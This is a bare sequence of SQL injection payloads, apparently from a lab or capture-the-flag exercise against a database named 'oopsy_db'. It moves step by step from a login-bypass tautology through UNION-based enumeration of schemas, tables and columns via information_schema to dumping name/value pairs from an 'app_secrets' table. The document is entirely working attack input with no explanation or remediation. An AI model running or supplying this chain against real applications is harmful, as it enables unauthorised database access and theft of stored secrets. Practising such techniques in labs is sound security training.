' OR 1=1 -- -
' UNION SELECT 1,2 -- -
' UNION SELECT 1,database() -- -
' UNION SELECT 1,schema_name FROM information_schema.schemata -- -
' UNION SELECT 1,table_name FROM information_schema.tables where table_schema='oopsy_db' -- -
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='app_secrets' -- -
' UNION SELECT name,value FROM app_secrets -- -